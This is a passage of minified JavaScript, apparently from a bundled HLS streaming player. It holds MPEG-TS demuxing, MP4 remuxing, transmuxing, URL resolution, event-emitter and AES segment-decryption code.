this.remainderData=null,la=C?this.demux(C,-1,!1,!0):{audioTrack:this._audioTrack,avcTrack:this._avcTrack,textTrack:this._txtTrack,id3Track:this._id3Track},this.extractRemainingSamples(la),this.sampleAes?this.decrypt(la,this.sampleAes):la},ka.extractRemainingSamples=function(la){var C,fa=la.audioTrack,qa=la.avcTrack;la=la.id3Track;var va=qa.pesData,xa=fa.pesData,za=la.pesData;va&&(C=t(va))?(this.parseAVCPES(C,!0),qa.pesData=null):qa.pesData=va,xa&&(C=t(xa))?(fa.isAAC?this.parseAACPES(C):this.parseMPEGPES(C),fa.pesData=null):(null!=xa&&xa.size&&O.b.log("last AAC PES packet truncated,might overlap between fragments"),fa.pesData=xa),za&&(C=t(za))?(this.parseID3PES(C),la.pesData=null):la.pesData=za},ka.demuxSampleAes=function(la,C,fa){return la=this.demux(la,fa,!0,!this.config.progressive),C=this.sampleAes=new B(this.observer,this.config,C),this.decrypt(la,C)},ka.decrypt=function(la,C){return new Promise((function(fa){var qa=la.audioTrack,va=la.avcTrack;qa.samples&&qa.isAAC?C.decryptAacSamples(qa.samples,0,(function(){va.samples?C.decryptAvcSamples(va.samples,0,0,(function(){fa(la)})):fa(la)})):va.samples&&C.decryptAvcSamples(va.samples,0,0,(function(){fa(la)}))}))},ka.destroy=function(){this._initPTS=this._initDTS=null,this._duration=0},ka.parseAVCPES=function(la,C){var fa,qa=this,va=this._avcTrack,xa=this.parseAVCNALu(la.data),za=this.avcSample,Ca=!1;la.data=null,za&&xa.length&&!va.audFound&&(r(za,va),za=this.avcSample=g(!1,la.pts,la.dts,"")),xa.forEach((function(Ba){switch(Ba.type){case 1:fa=!0,za||(za=qa.avcSample=g(!0,la.pts,la.dts,"")),za.frame=!0;var Ga=Ba.data;Ca&&4<Ga.length&&(2!==(Ga=new H(Ga).readSliceType())&&4!==Ga&&7!==Ga&&9!==Ga||(za.key=!0));break;case 5:fa=!0,za||(za=qa.avcSample=g(!0,la.pts,la.dts,"")),za.key=!0,za.frame=!0;break;case 6:fa=!0,(Ga=new H(z(Ba.data))).readUByte();for(var Ra,La,hb,Ya=!1;!Ya&&1<Ga.bytesAvailable;){Ra=0;do{Ra+=hb=Ga.readUByte()}while(255===hb);La=0;do{La+=hb=Ga.readUByte()}while(255===hb);if(4===Ra&&0!==Ga.bytesAvailable){if(Ya=!0,181===Ga.readUByte()&&49===Ga.readUShort()&&1195456820===Ga.readUInt()&&3===Ga.readUByte()){for(Ra=31&(hb=Ga.readUByte()),hb=[hb,Ga.readUByte()],La=0;La<Ra;La++)hb.push(Ga.readUByte()),hb.push(Ga.readUByte()),hb.push(Ga.readUByte());x(qa._txtTrack.samples,{type:3,pts:la.pts,bytes:hb})}}else if(5===Ra&&0!==Ga.bytesAvailable){if(Ya=!0,16<La){hb=[];for(var bb=0;16>bb;bb++)hb.push(Ga.readUByte().toString(16)),3!==bb&&5!==bb&&7!==bb&&9!==bb||hb.push("-");La-=16,bb=new Uint8Array(La);for(var Da=0;Da<La;Da++)bb[Da]=Ga.readUByte();x(qa._txtTrack.samples,{pts:la.pts,payloadType:Ra,uuid:hb.join(""),userData:Object(w.f)(bb),userDataBytes:bb})}}else if(La<Ga.bytesAvailable)for(Ra=0;Ra<La;Ra++)Ga.readUByte()}break;case 7:if(fa=!0,Ca=!0,!va.sps){for(Ga=new H(Ba.data).readSPS(),va.width=Ga.width,va.height=Ga.height,va.pixelRatio=Ga.pixelRatio,va.sps=[Ba.data],va.duration=qa._duration,Ga=Ba.data.subarray(1,4),Ya="avc1.",Ra=0;3>Ra;Ra++)2>(hb=Ga[Ra].toString(16)).length&&(hb="0"+hb),Ya+=hb;va.codec=Ya}break;case 8:fa=!0,va.pps||(va.pps=[Ba.data]);break;case 9:fa=!1,va.audFound=!0,za&&r(za,va),za=qa.avcSample=g(!1,la.pts,la.dts,"");break;case 12:fa=!1;break;default:fa=!1,za&&(za.debug+="unknown NAL "+Ba.type+" ")}za&&fa&&za.units.push(Ba)})),C&&za&&(r(za,va),this.avcSample=null)},ka.getLastNalUnit=function(){var la,C=this.avcSample;if(C&&0!==C.units.length||(C=(C=this._avcTrack.samples)[C.length-1]),null!==(la=C)&&void 0!==la&&la.units)var fa=(la=C.units)[la.length-1];return fa},ka.parseAVCNALu=function(la){var C,fa,qa=la.byteLength,va=this._avcTrack,xa=va.naluState||0,za=xa,Ca=[],Ba=0,Ga=-1,Ra=0;for(-1===xa&&(Ga=0,Ra=31&la[0],xa=0,Ba=1);Ba<qa;)if(C=la[Ba++],xa)if(1!==xa)if(C)if(1===C){if(0<=Ga)C={data:la.subarray(Ga,Ba-xa-1),type:Ra},Ca.push(C);else if((C=this.getLastNalUnit())&&(za&&Ba<=4-za&&C.state&&(C.data=C.data.subarray(0,C.data.byteLength-za)),0<(fa=Ba-xa-1))){var La=new Uint8Array(C.data.byteLength+fa);La.set(C.data,0),La.set(la.subarray(0,fa),C.data.byteLength),C.data=La}Ba<qa?(Ga=Ba,Ra=31&la[Ba],xa=0):xa=-1}else xa=0;else xa=3;else xa=C?0:2;else xa=C?0:1;return 0<=Ga&&0<=xa&&(fa={data:la.subarray(Ga,qa),type:Ra,state:xa},Ca.push(fa)),0===Ca.length&&(fa=this.getLastNalUnit())&&((qa=new Uint8Array(fa.data.byteLength+la.byteLength)).set(fa.data,0),qa.set(la,fa.data.byteLength),fa.data=qa),va.naluState=xa,Ca},ka.parseAACPES=function(la){var C,fa,qa,va=this._audioTrack,xa=this.aacLastPTS,za=this.aacOverFlow,Ca=la.data;if(za){var Ba=new Uint8Array(za.byteLength+Ca.byteLength);Ba.set(za,0),Ba.set(Ca,za.byteLength),Ca=Ba}for(Ba=0,C=Ca.length;Ba<C-1&&!(Ba+1<Ca.length&&Oa(Ca,Ba));Ba++);if(!Ba||(Ba<C-1?(fa="AAC PES did not start with ADTS header,offset:"+Ba,qa=!1):(fa="no ADTS header found in AAC PES",qa=!0),O.b.warn("parsing error:"+fa),this.observer.emit(I.a.ERROR,I.a.ERROR,{type:L.b.MEDIA_ERROR,details:L.a.FRAG_PARSING_ERROR,fatal:qa,reason:fa}),!qa)){if(M(va,this.observer,Ca,Ba,this.audioCodec),fa=0,qa=9216e4/va.samplerate,void 0!==la.pts)la=la.pts;else{if(null===xa)return void O.b.warn("[tsdemuxer]: AAC PES unknown PTS");la=xa}for(za&&null!==xa&&(xa+=qa,1<Math.abs(xa-la)&&(O.b.log("[tsdemuxer]: AAC: align PTS for overlapping frames by "+Math.round((xa-la)/90)),la=xa)),xa=null;Ba<C;){if(Ba+1<Ca.length&&Oa(Ca,Ba)){if(Ba+5<C&&(za=v(va,Ca,Ba,la,fa))){Ba+=za.length,xa=za.sample.pts,fa++;continue}break}Ba++}this.aacOverFlow=Ba<C?Ca.subarray(Ba,C):null,this.aacLastPTS=xa}},ka.parseMPEGPES=function(la){var C=la.data,fa=C.length,qa=0,va=0;if(void 0!==(la=la.pts))for(;va<fa;)if(va+1<C.length&&f(C,va)){var xa=p(this._audioTrack,C,va,la,qa);if(!xa)break;va+=xa.length,qa++}else va++;else O.b.warn("[tsdemuxer]: MPEG PES unknown PTS")},ka.parseID3PES=function(la){void 0!==la.pts?this._id3Track.samples.push(la):O.b.warn("[tsdemuxer]: ID3 PES unknown PTS")},ha}()).minProbeByteLength=188,P=function(ha){function ka(){return ha.apply(this,arguments)||this}ka.prototype=Object.create(ha.prototype),ka.prototype.constructor=ka,J(ka,ha);var la=ka.prototype;return la.resetInitSegment=function(C,fa,qa){ha.prototype.resetInitSegment.call(this,C,fa,qa),this._audioTrack={container:"audio/mpeg",type:"audio",id:0,pid:-1,sequenceNumber:0,isAAC:!1,samples:[],manifestCodec:C,duration:qa,inputTimeScale:9e4,dropped:0}},ka.probe=function(C){if(!C)return!1;for(var fa=(w.b(C,0)||[]).length,qa=C.length;fa<qa;fa++){var va=C,xa=fa;if(xa+1<va.length&&f(va,xa)){var za=l(va,xa),Ca=4;null!=za&&za.frameLength&&(Ca=za.frameLength),va=(xa+=Ca)===va.length||xa+1<va.length&&f(va,xa)}else va=!1;if(va)return O.b.log("MPEG Audio sync word found !"),!0}return!1},la.canParse=function(C,fa){return f(C,fa)&&4<=C.length-fa},la.appendFrame=function(C,fa,qa){if(null!==this.initPTS)return p(C,fa,qa,this.initPTS,this.frameIndex)},ka}(P),P.minProbeByteLength=4;var Y=Na(15),Z=Na(4),na=function(){function ha(){this.emitInitSegment=!1,this.initTracks=this.initPTS=this.initData=this.videoCodec=this.audioCodec=void 0,this.lastEndDTS=null}var ka=ha.prototype;return ka.destroy=function(){},ka.resetTimeStamp=function(la){this.initPTS=la,this.lastEndDTS=null},ka.resetNextTimestamp=function(){this.lastEndDTS=null},ka.resetInitSegment=function(la,C,fa){this.audioCodec=C,this.videoCodec=fa,this.generateInitSegment(la),this.emitInitSegment=!0},ka.generateInitSegment=function(la){var C=this.audioCodec,fa=this.videoCodec;if(!la||!la.byteLength)return this.initTracks=void 0,void(this.initData=void 0);var qa=this.initData=Object(h.f)(la);C||(C=E(qa.audio,Z.a.AUDIO)),fa||(fa=E(qa.video,Z.a.VIDEO));var va={};qa.audio&&qa.video?va.audiovideo={container:"video/mp4",codec:C+","+fa,initSegment:la,id:"main"}:qa.audio?va.audio={container:"audio/mp4",codec:C,initSegment:la,id:"audio"}:qa.video?va.video={container:"video/mp4",codec:fa,initSegment:la,id:"main"}:O.b.warn("[passthrough-remuxer.ts]: initSegment does not contain moov or trak boxes."),this.initTracks=va},ka.remux=function(la,C,fa,qa,va){var xa=this.initPTS,za=this.lastEndDTS;if(la={audio:void 0,video:void 0,text:qa,id3:fa,initSegment:void 0},Object(N.a)(za)||(za=this.lastEndDTS=va||0),!(va=C.samples)||!va.length)return la;C={initPTS:void 0,timescale:1};var Ca=this.initData;if(Ca&&Ca.length||(this.generateInitSegment(va),Ca=this.initData),!Ca||!Ca.length)return O.b.warn("[passthrough-remuxer.ts]: Failed to generate initSegment."),la;this.emitInitSegment&&(C.tracks=this.initTracks,this.emitInitSegment=!1),Object(N.a)(xa)||(xa=za,xa=Object(h.d)(Ca,va)-xa,this.initPTS=C.initPTS=xa);var Ba=Object(h.c)(va,Ca),Ga=Ba+za;return Object(h.e)(Ca,va,xa),0<Ba?this.lastEndDTS=Ga:(O.b.warn("Duration parsed from mp4 should be greater than zero"),this.resetNextTimestamp()),Ba="",(xa=!!Ca.audio)&&(Ba+="audio"),(Ca=!!Ca.video)&&(Ba+="video"),va={data1:va,startPTS:za,startDTS:za,endPTS:Ga,endDTS:Ga,type:Ba,hasAudio:xa,hasVideo:Ca,nb:1,dropped:0},la.audio="audio"===va.type?va:void 0,la.video="audio"!==va.type?va:void 0,la.text=qa,la.id3=fa,la.initSegment=C,la},ha}(),T=Na(12);try{var pa=self.performance.now.bind(self.performance)}catch(ha){O.b.debug("Unable to use Performance API on this environment"),pa=self.Date.now}var ia=[{demux:Va,remux:Y.a},{demux:R,remux:na},{demux:wa,remux:Y.a},{demux:P,remux:Y.a}],S=1024;ia.forEach((function(ha){S=Math.max(S,ha.demux.minProbeByteLength)}));var V=function(){function ha(la,C,fa,qa){this.probe=this.decrypter=this.remuxer=this.demuxer=this.vendor=this.config=this.typeSupported=this.observer=void 0,this.decryptionPromise=null,this.currentTransmuxState=this.transmuxConfig=void 0,this.cache=new T.a,this.observer=la,this.typeSupported=C,this.config=fa,this.vendor=qa}var ka=ha.prototype;return ka.configure=function(la){this.transmuxConfig=la,this.decrypter&&this.decrypter.reset()},ka.push=function(la,C,fa,qa){var va=this,xa=fa.transmuxing;xa.executeStart=pa();var Ta,qb,za=new Uint8Array(la),Ca=this.cache,Ba=this.config,Ga=this.currentTransmuxState;if(la=this.transmuxConfig,qa&&(this.currentTransmuxState=qa),Ta=C,qb=null,0<za.byteLength&&null!=Ta&&null!=Ta.key&&null!==Ta.iv&&null!=Ta.method&&(qb=Ta),(C=qb)&&"AES-128"===C.method){var Ra=this.getDecrypter();if(!Ba.enableSoftwareAES)return this.decryptionPromise=Ra.webCryptoDecrypt(za,C.key.buffer,C.iv.buffer).then((function(eb){return eb=va.push(eb,null,fa),va.decryptionPromise=null,eb})),this.decryptionPromise;if(!(za=Ra.softwareDecrypt(za,C.key.buffer,C.iv.buffer)))return xa.executeEnd=pa(),{remuxResult:{},chunkMeta:fa};za=new Uint8Array(za)}var La=qa||Ga;Ga=La.contiguous,Ba=La.discontinuity,Ra=La.trackSwitch,qa=La.accurateTimeOffset,La=La.timeOffset;var Ya=la.audioCodec,hb=la.videoCodec,bb=la.defaultInitPts,Da=la.duration,Pa=la.initSegmentData;return(Ba||Ra)&&this.resetInitSegment(Pa,Ya,hb,Da),Ba&&this.resetInitialTimestamp(bb),Ga||this.resetContiguity(),this.needsProbing(za,Ba,Ra)&&(Ca.dataLength&&(Ca=Ca.flush(),za=Object(h.a)(Ca,za)),this.configureTransmuxer(za,la)),la=this.transmux(za,C,La,qa,fa),(za=this.currentTransmuxState).contiguous=!0,za.discontinuity=!1,za.trackSwitch=!1,xa.executeEnd=pa(),la},ka.flush=function(la){var C=this,fa=la.transmuxing;fa.executeStart=pa();var qa=this.decrypter,va=this.cache,xa=this.currentTransmuxState,za=this.decryptionPromise;if(za)return za.then((function(){return C.flush(la)}));var Ca=[];return xa=xa.timeOffset,qa&&(qa=qa.flush())&&Ca.push(this.push(qa,null,la)),qa=va.dataLength,va.reset(),va=this.demuxer,za=this.remuxer,va&&za?D(fa=va.flush(xa))?fa.then((function(Ba){return C.flushRemux(Ca,Ba,la),Ca})):(this.flushRemux(Ca,fa,la),Ca):(qa>=S&&this.observer.emit(I.a.ERROR,I.a.ERROR,{type:L.b.MEDIA_ERROR,details:L.a.FRAG_PARSING_ERROR,fatal:!0,reason:"no demux matching with content found"}),fa.executeEnd=pa(),[{remuxResult:{},chunkMeta:la}])},ka.flushRemux=function(la,C,fa){var qa=C.audioTrack,va=C.avcTrack,xa=C.id3Track;C=C.textTrack;var za=this.currentTransmuxState,Ca=za.accurateTimeOffset;za=za.timeOffset,O.b.log("[transmuxer.ts]: Flushed fragment "+fa.sn+(-1<fa.part?" p: "+fa.part:"")+" of level "+fa.level),qa=this.remuxer.remux(qa,va,xa,C,za,Ca,!0),la.push({remuxResult:qa,chunkMeta:fa}),fa.transmuxing.executeEnd=pa()},ka.resetInitialTimestamp=function(la){var C=this.demuxer,fa=this.remuxer;C&&fa&&(C.resetTimeStamp(la),fa.resetTimeStamp(la))},ka.resetContiguity=function(){var la=this.demuxer,C=this.remuxer;la&&C&&(la.resetContiguity(),C.resetNextTimestamp())},ka.resetInitSegment=function(la,C,fa,qa){var va=this.demuxer,xa=this.remuxer;va&&xa&&(va.resetInitSegment(C,fa,qa),xa.resetInitSegment(la,C,fa))},ka.destroy=function(){this.demuxer&&(this.demuxer.destroy(),this.demuxer=void 0),this.remuxer&&(this.remuxer.destroy(),this.remuxer=void 0)},ka.transmux=function(la,C,fa,qa,va){return C&&"SAMPLE-AES"===C.method?this.transmuxSampleAes(la,C,fa,qa,va):this.transmuxUnencrypted(la,fa,qa,va)},ka.transmuxUnencrypted=function(la,C,fa,qa){return la=this.demuxer.demux(la,C,!1,!this.config.progressive),{remuxResult:this.remuxer.remux(la.audioTrack,la.avcTrack,la.id3Track,la.textTrack,C,fa,!1),chunkMeta:qa}},ka.transmuxSampleAes=function(la,C,fa,qa,va){var xa=this;return this.demuxer.demuxSampleAes(la,C,fa).then((function(za){return{remuxResult:xa.remuxer.remux(za.audioTrack,za.avcTrack,za.id3Track,za.textTrack,fa,qa,!1),chunkMeta:va}}))},ka.configureTransmuxer=function(la,C){var fa=this.config,qa=this.observer,va=this.typeSupported,xa=this.vendor,za=C.audioCodec,Ca=C.defaultInitPts,Ba=C.duration,Ga=C.initSegmentData;C=C.videoCodec;for(var Ra=0,La=ia.length;Ra<La;Ra++)if(ia[Ra].demux.probe(la)){var Ya=ia[Ra];break}Ya||(O.b.warn("Failed to find demuxer by probing frag, treating as mp4 passthrough"),Ya={demux:R,remux:na}),la=this.demuxer,Ra=this.remuxer,La=Ya.remux,Ya=Ya.demux,Ra&&Ra instanceof La||(this.remuxer=new La(qa,fa,va,xa)),la&&la instanceof Ya||(this.demuxer=new Ya(qa,fa,va),this.probe=Ya.probe),this.resetInitSegment(Ga,za,C,Ba),this.resetInitialTimestamp(Ca)},ka.needsProbing=function(la,C,fa){return!this.demuxer||!this.remuxer||C||fa},ka.getDecrypter=function(){var la=this.decrypter;return la||(la=this.decrypter=new G.a(this.observer,this.config)),la},ha}(),oa=function(ha,ka,la,C,fa){this.defaultInitPts=this.duration=this.initSegmentData=this.videoCodec=this.audioCodec=void 0,this.audioCodec=ha,this.videoCodec=ka,this.initSegmentData=la,this.duration=C,this.defaultInitPts=fa},ba=function(ha,ka,la,C,fa){this.discontinuity=ha,this.contiguous=ka,this.accurateTimeOffset=la,this.trackSwitch=C,this.timeOffset=fa}},function(wa,Va,Na){var Oa=/^((?:[a-zA-Z0-9+\-.]+:)?)(\/\/[^\/?#]*)?((?:[^\/?#]*\/)*[^;?#]*)?(;[^?#]*)?(\?[^#]*)?(#.*)?$/,u=/^([^\/?#]*)(.*)$/,da=/(?:\/|^)\.(?=\/)/g,M=/(?:\/|^)\.\.\/(?!\.\.\/)[^\/]*(?=\/)/g,v={buildAbsoluteURL:function(m,p,l){if(l=l||{},m=m.trim(),!(p=p.trim())){if(!l.alwaysNormalize)return m;if(!(l=v.parseURL(m)))throw Error("Error trying to parse base URL.");return l.path=v.normalizePath(l.path),v.buildURLFromParts(l)}var f=v.parseURL(p);if(!f)throw Error("Error trying to parse relative URL.");if(f.scheme)return l.alwaysNormalize?(f.path=v.normalizePath(f.path),v.buildURLFromParts(f)):p;if(!(p=v.parseURL(m)))throw Error("Error trying to parse base URL.");return!p.netLoc&&p.path&&"/"!==p.path[0]&&(m=u.exec(p.path),p.netLoc=m[1],p.path=m[2]),p.netLoc&&!p.path&&(p.path="/"),m={scheme:p.scheme,netLoc:f.netLoc,path:null,params:f.params,query:f.query,fragment:f.fragment},f.netLoc||(m.netLoc=p.netLoc,"/"===f.path[0])||(f.path?(p=(p=p.path).substring(0,p.lastIndexOf("/")+1)+f.path,m.path=v.normalizePath(p)):(m.path=p.path,f.params||(m.params=p.params,f.query||(m.query=p.query)))),null===m.path&&(m.path=l.alwaysNormalize?v.normalizePath(f.path):f.path),v.buildURLFromParts(m)},parseURL:function(m){return(m=Oa.exec(m))?{scheme:m[1]||"",netLoc:m[2]||"",path:m[3]||"",params:m[4]||"",query:m[5]||"",fragment:m[6]||""}:null},normalizePath:function(m){for(m=m.split("").reverse().join("").replace(da,"");m.length!==(m=m.replace(M,"")).length;);return m.split("").reverse().join("")},buildURLFromParts:function(m){return m.scheme+m.netLoc+m.path+m.params+m.query+m.fragment}};wa.exports=v},function(wa,Va,Na){Na.d(Va,"a",(function(){return Oa}));var Oa=function(){this.aborted=!1,this.bwEstimate=this.chunkCount=this.total=this.retry=this.loaded=0,this.loading={start:0,first:0,end:0},this.parsing={start:0,end:0},this.buffering={start:0,first:0,end:0}}},function(wa,Va,Na){Na.d(Va,"a",(function(){return Oa}));var Oa=function(){function u(){this.chunks=[],this.dataLength=0}var da=u.prototype;return da.push=function(M){this.chunks.push(M),this.dataLength+=M.length},da.flush=function(){var M,v=this.chunks,m=this.dataLength;if(v.length){if(1===v.length)v=v[0];else{m=new Uint8Array(m);for(var p=0,l=0;l<v.length;l++){var f=v[l];m.set(f,p),p+=f.length}v=m}M=v,this.reset(),v=M}else v=new Uint8Array(0);return v},da.reset=function(){this.dataLength=this.chunks.length=0},u}()},function(wa,Va,Na){function Oa(){}function u(l,f,g){this.fn=l,this.context=f,this.once=g||!1}function da(l,f,g,t,r){if("function"!=typeof g)throw new TypeError("The listener must be a function");return g=new u(g,t||l,r),f=p?p+f:f,l._events[f]?l._events[f].fn?l._events[f]=[l._events[f],g]:l._events[f].push(g):(l._events[f]=g,l._eventsCount++),l}function M(l,f){0==--l._eventsCount?l._events=new Oa:delete l._events[f]}function v(){this._events=new Oa,this._eventsCount=0}var m=Object.prototype.hasOwnProperty,p="~";Object.create&&(Oa.prototype=Object.create(null),(new Oa).__proto__||(p=!1)),v.prototype.eventNames=function(){var l,f,g=[];if(0===this._eventsCount)return g;for(f in l=this._events)m.call(l,f)&&g.push(p?f.slice(1):f);return Object.getOwnPropertySymbols?g.concat(Object.getOwnPropertySymbols(l)):g},v.prototype.listeners=function(l){if(!(l=this._events[p?p+l:l]))return[];if(l.fn)return[l.fn];for(var f=0,g=l.length,t=Array(g);f<g;f++)t[f]=l[f].fn;return t},v.prototype.listenerCount=function(l){return(l=this._events[p?p+l:l])?l.fn?1:l.length:0},v.prototype.emit=function(l,f,g,t,r,x){var z=p?p+l:l;if(!this._events[z])return!1;var J,E=this._events[z],D=arguments.length;if(E.fn){switch(E.once&&this.removeListener(l,E.fn,void 0,!0),D){case 1:return E.fn.call(E.context),!0;case 2:return E.fn.call(E.context,f),!0;case 3:return E.fn.call(E.context,f,g),!0;case 4:return E.fn.call(E.context,f,g,t),!0;case 5:return E.fn.call(E.context,f,g,t,r),!0;case 6:return E.fn.call(E.context,f,g,t,r,x),!0}for(z=1,J=Array(D-1);z<D;z++)J[z-1]=arguments[z];E.fn.apply(E.context,J)}else{var I=E.length;for(z=0;z<I;z++)switch(E[z].once&&this.removeListener(l,E[z].fn,void 0,!0),D){case 1:E[z].fn.call(E[z].context);break;case 2:E[z].fn.call(E[z].context,f);break;case 3:E[z].fn.call(E[z].context,f,g);break;case 4:E[z].fn.call(E[z].context,f,g,t);break;default:if(!J){var L=1;for(J=Array(D-1);L<D;L++)J[L-1]=arguments[L]}E[z].fn.apply(E[z].context,J)}}return!0},v.prototype.on=function(l,f,g){return da(this,l,f,g,!1)},v.prototype.once=function(l,f,g){return da(this,l,f,g,!0)},v.prototype.removeListener=function(l,f,g,t){if(l=p?p+l:l,!this._events[l])return this;if(!f)return M(this,l),this;var r=this._events[l];if(r.fn)r.fn!==f||t&&!r.once||g&&r.context!==g||M(this,l);else{for(var x=0,z=[],J=r.length;x<J;x++)(r[x].fn!==f||t&&!r[x].once||g&&r[x].context!==g)&&z.push(r[x]);z.length?this._events[l]=1===z.length?z[0]:z:M(this,l)}return this},v.prototype.removeAllListeners=function(l){var f;return l?(f=p?p+l:l,this._events[f]&&M(this,f)):(this._events=new Oa,this._eventsCount=0),this},v.prototype.off=v.prototype.removeListener,v.prototype.addListener=v.prototype.on,v.prefixed=p,v.EventEmitter=v,wa.exports=v},function(wa,Va,Na){Na.d(Va,"a",(function(){return p}));var Oa=function(){function l(f,g){this.aesIV=this.subtle=void 0,this.subtle=f,this.aesIV=g}return l.prototype.decrypt=function(f,g){return this.subtle.decrypt({name:"AES-CBC",iv:this.aesIV},g,f)},l}(),u=function(){function l(f,g){this.key=this.subtle=void 0,this.subtle=f,this.key=g}return l.prototype.expandKey=function(){return this.subtle.importKey("raw",this.key,{name:"AES-CBC"},!1,["encrypt","decrypt"])},l}(),da=Na(8),M=function(){function l(){this.rcon=[0,1,2,4,8,16,32,64,128,27,54],this.subMix=[new Uint32Array(256),new Uint32Array(256),new Uint32Array(256),new Uint32Array(256)],this.invSubMix=[new Uint32Array(256),new Uint32Array(256),new Uint32Array(256),new Uint32Array(256)],this.sBox=new Uint32Array(256),this.invSBox=new Uint32Array(256),this.key=new Uint32Array(0),this.keySize=this.ksRows=0,this.invKeySchedule=this.keySchedule=void 0,this.initTable()}var f=l.prototype;return f.uint8ArrayToUint32Array_=function(g){g=new DataView(g);for(var t=new Uint32Array(4),r=0;4>r;r++)t[r]=g.getUint32(4*r);return t},f.initTable=function(){var g=this.sBox,t=this.invSBox,r=this.subMix,x=r[0],z=r[1],J=r[2];r=r[3];var E=this.invSubMix,D=E[0],I=E[1],L=E[2];E=E[3];var h,G=new Uint32Array(256),N=0,w=0;for(h=0;256>h;h++)G[h]=128>h?h<<1:h<<1^283;for(h=0;256>h;h++){var F=w^w<<1^w<<2^w<<3^w<<4;F=F>>>8^255&F^99,g[N]=F,t[F]=N;var P=G[N],O=G[P],R=G[O],Q=257*G[F]^16843008*F;x[N]=Q<<24|Q>>>8,z[N]=Q<<16|Q>>>16,J[N]=Q<<8|Q>>>24,r[N]=Q,Q=16843009*R^65537*O^257*P^16843008*N,D[F]=Q<<24|Q>>>8,I[F]=Q<<16|Q>>>16,L[F]=Q<<8|Q>>>24,E[F]=Q,N?(N=P^G[G[G[R^P]]],w^=G[G[w]]):N=w=1}},f.expandKey=function(g){g=this.uint8ArrayToUint32Array_(g);for(var t=!0,r=0;r<g.length&&t;)t=g[r]===this.key[r],r++;if(!t){this.key=g;var z,J,x=this.keySize=g.length;if(4!==x&&6!==x&&8!==x)throw Error("Invalid aes key size="+x);t=this.ksRows=4*(x+6+1),r=this.keySchedule=new Uint32Array(t);var E=this.invKeySchedule=new Uint32Array(t),D=this.sBox,I=this.rcon,L=this.invSubMix,G=L[0],N=L[1],w=L[2],h=L[3];for(L=0;L<t;L++)L<x?z=r[L]=g[L]:(J=z,0==L%x?(J=D[(J=J<<8|J>>>24)>>>24]<<24|D[J>>>16&255]<<16|D[J>>>8&255]<<8|D[255&J],J^=I[L/x|0]<<24):6<x&&4==L%x&&(J=D[J>>>24]<<24|D[J>>>16&255]<<16|D[J>>>8&255]<<8|D[255&J]),r[L]=z=(r[L-x]^J)>>>0);for(z=0;z<t;z++)L=t-z,J=3&z?r[L]:r[L-4],E[z]=4>z||4>=L?J:G[D[J>>>24]]^N[D[J>>>16&255]]^w[D[J>>>8&255]]^h[D[255&J]],E[z]>>>=0}},f.networkToHostOrderSwap=function(g){return g<<24|(65280&g)<<8|(16711680&g)>>8|g>>>24},f.decrypt=function(g,t,r){var x,z=this.keySize+6,J=this.invKeySchedule,E=this.invSBox,D=this.invSubMix,I=D[0],L=D[1],G=D[2];D=D[3];var N=this.uint8ArrayToUint32Array_(r);r=N[0];var w=N[1],h=N[2];N=N[3];for(var F=new Int32Array(g),P=new Int32Array(F.length),O=this.networkToHostOrderSwap;t<F.length;){var R=O(F[t]),Q=O(F[t+1]),ja=O(F[t+2]),W=O(F[t+3]),aa=R^J[0],ma=W^J[1],H=ja^J[2],B=Q^J[3],A=4;for(x=1;x<z;x++){g=I[aa>>>24]^L[ma>>16&255]^G[H>>8&255]^D[255&B]^J[A];var Y=I[ma>>>24]^L[H>>16&255]^G[B>>8&255]^D[255&aa]^J[A+1],Z=I[H>>>24]^L[B>>16&255]^G[aa>>8&255]^D[255&ma]^J[A+2];B=I[B>>>24]^L[aa>>16&255]^G[ma>>8&255]^D[255&H]^J[A+3],aa=g,ma=Y,H=Z,A+=4}g=E[aa>>>24]<<24^E[ma>>16&255]<<16^E[H>>8&255]<<8^E[255&B]^J[A],Y=E[ma>>>24]<<24^E[H>>16&255]<<16^E[B>>8&255]<<8^E[255&aa]^J[A+1],Z=E[H>>>24]<<24^E[B>>16&255]<<16^E[aa>>8&255]<<8^E[255&ma]^J[A+2],B=E[B>>>24]<<24^E[aa>>16&255]<<16^E[ma>>8&255]<<8^E[255&H]^J[A+3],P[t]=O(g^r),P[t+1]=O(B^w),P[t+2]=O(Z^h),P[t+3]=O(Y^N),r=R,w=Q,h=ja,N=W,t+=4}return P.buffer},l}(),v=Na(1),m=Na(5),p=function(){function l(g,t,r){if(r=void 0===(r=(void 0===r?{}:r).removePKCS7Padding)||r,this.logEnabled=!0,this.observer=void 0,this.config=void 0,this.removePKCS7Padding=void 0,this.subtle=null,this.softwareDecrypter=null,this.key=null,this.fastAesKey=null,this.remainderData=null,this.currentIV=null,this.currentResult=null,this.observer=g,this.config=t,this.removePKCS7Padding=r,r)try{var x=self.crypto;x&&(this.subtle=x.subtle||x.webkitSubtle)}catch(z){}null===this.subtle&&(this.config.enableSoftwareAES=!0)}var f=l.prototype;return f.destroy=function(){this.observer=null},f.isSync=function(){return this.config.enableSoftwareAES},f.flush=function(){var t,r,g=this.currentResult;if(g)return g=new Uint8Array(g),this.reset(),this.removePKCS7Padding&&(r=(t=g.byteLength)&&new DataView(g.buffer).getUint8(t-1))?Object(da.a)(g,0,t-r):g;this.reset()},f.reset=function(){this.remainderData=this.currentIV=this.currentResult=null,this.softwareDecrypter&&(this.softwareDecrypter=null)},f.decrypt=function(g,t,r,x){this.config.enableSoftwareAES?(this.softwareDecrypt(new Uint8Array(g),t,r),(g=this.flush())&&x(g.buffer)):this.webCryptoDecrypt(new Uint8Array(g),t,r).then(x)},f.softwareDecrypt=function(g,t,r){var x=this.currentIV,z=this.currentResult,J=this.remainderData;return this.logOnce("JS AES decrypt"),J&&(g=Object(m.a)(J,g),this.remainderData=null),(g=this.getValidChunk(g)).length?(x&&(r=x),(x=this.softwareDecrypter)||(x=this.softwareDecrypter=new M),x.expandKey(t),this.currentResult=x.decrypt(g.buffer,0,r),this.currentIV=Object(da.a)(g,-16).buffer,z||null):null},f.webCryptoDecrypt=function(g,t,r){var x=this,z=this.subtle;return this.key===t&&this.fastAesKey||(this.key=t,this.fastAesKey=new u(z,t)),this.fastAesKey.expandKey().then((function(J){return z?new Oa(z,r).decrypt(g.buffer,J):Promise.reject(Error("web crypto not initialized"))})).catch((function(J){return x.onWebCryptoError(J,g,t,r)}))},f.onWebCryptoError=function(g,t,r,x){return v.b.warn("[decrypter.ts]: WebCrypto Error, disable WebCrypto API:",g),this.config.enableSoftwareAES=!0,this.logEnabled=!0,this.softwareDecrypt(t,r,x)},f.getValidChunk=function(g){var t=g,r=g.length-g.length%16;return r!==g.length&&(t=Object(da.a)(g,0,r),this.remainderData=Object(da.a)(g,r)),t},f.logOnce=function(g){this.logEnabled&&(v.b.log("[decrypter.ts]: 